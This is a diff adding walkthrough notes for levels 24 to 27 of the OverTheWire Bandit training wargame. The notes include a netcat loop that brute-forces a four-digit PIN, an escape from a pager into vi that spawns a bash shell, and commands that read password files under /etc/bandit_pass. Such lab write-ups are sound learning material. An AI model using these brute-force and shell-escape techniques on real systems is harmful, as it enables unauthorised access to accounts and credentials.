@@ -79,3 +79,32 @@ Wait up to 60 seconds for the `cron` job to run, then check the output:
 cat pass.txt
 
 #The output is the password
+
+-------------------------LEVEL 24------------------------
+#The daemon requires the following format for each attempt:
+<bandit24_password> <4-digit-pin>
+
+#Instead of connecting 10,000 times, you must create a Bash loop that prints the fixed bandit24 password alongside every possible PIN combination from 0000 to 9999 in a single stream.
+#Send the entire list of combinations to the service running on localhost port 30002 using a pipe (|).
+for i in {0000..9999}; do echo "YOUR_BANDIT24_PASSWORD $i"; done | nc localhost 30002
+
+#When the bucle ends up you will see "Correct! The password of user bandit25 is ..."
+
+------------------------LEVEL 25 and 26-------------------------
+#Bring the private key (bandit26.sshkey) to your local machine (or your workspace) and restrict its permissions so SSH allows its use:
+chmod 600 bandit26.sshkey
+
+#Crucial Step: Manually resize your terminal window so it is extremely small (about 3 to 5 lines high). This forces the target's text-viewer shell to pause execution instead of printing everything and exiting immediately. Then connect to the server while your terminal winddows is minimized.
+ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
+#If done correctly, the session will freeze, displaying a `:` or `--More--` prompt at the bottom.
+#Once inside `vi`, you can execute arbitrary commands or change the shell environment. Run the following internal `vi` commands:
+:set shell=/bin/bash
+#Press ESC
+:shell
+
+#Finally, if you want the password make a cat to /etc/bandit_pass/bandit26
+
+#For level 27 you must check the level 19 steps and type the same 
+./bandit27-do cat /etc/bandit_pass/bandit27
+
+
